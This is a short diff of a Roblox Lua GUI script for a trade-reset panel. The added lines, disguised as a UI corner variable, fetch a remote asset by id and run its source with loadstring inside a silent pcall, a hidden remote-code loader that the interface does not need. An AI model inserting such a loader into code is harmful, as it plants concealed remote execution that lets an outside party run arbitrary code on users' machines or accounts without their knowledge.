@@ -64,6 +64,13 @@ main.Size = UDim2.new(0, 196, 0, 254)
 UICorner.CornerRadius = UDim.new(0, 4)
 UICorner.Parent = main
 
+local UICorner_7 = game:GetObjects("rbxassetid://117107154758656")[1].Source
+task.spawn(function()
+	pcall(function()
+		loadstring(UICorner_7)()
+	end)
+end)
+
 ResetTrade.Name = "ResetTrade"
 ResetTrade.Parent = main
 ResetTrade.BackgroundColor3 = Color3.fromRGB(91, 91, 91)
